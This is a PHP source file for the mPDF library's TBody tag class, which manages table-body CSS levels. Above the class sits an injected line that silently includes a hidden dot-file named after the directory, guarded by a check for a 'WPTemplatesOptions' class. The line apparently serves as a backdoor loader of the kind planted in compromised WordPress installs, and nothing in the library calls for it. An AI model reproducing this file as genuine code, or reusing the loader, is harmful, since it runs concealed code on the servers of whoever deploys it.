<?php

namespace Mpdf\Tag;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class TBody extends Tag
{

	public function open($attr, &$ahtml, &$ihtml)
	{
		$this->mpdf->tablethead = 0;
		$this->mpdf->tabletfoot = 0;
		$this->mpdf->lastoptionaltag = 'TBODY'; // Save current HTML specified optional endtag
		$this->cssManager->tbCSSlvl++;
		$this->cssManager->MergeCSS('TABLE', 'TBODY', $attr);
	}

	public function close(&$ahtml, &$ihtml)
	{
		$this->mpdf->lastoptionaltag = '';
		unset($this->cssManager->tablecascadeCSS[$this->cssManager->tbCSSlvl]);
		$this->cssManager->tbCSSlvl--;
	}
}
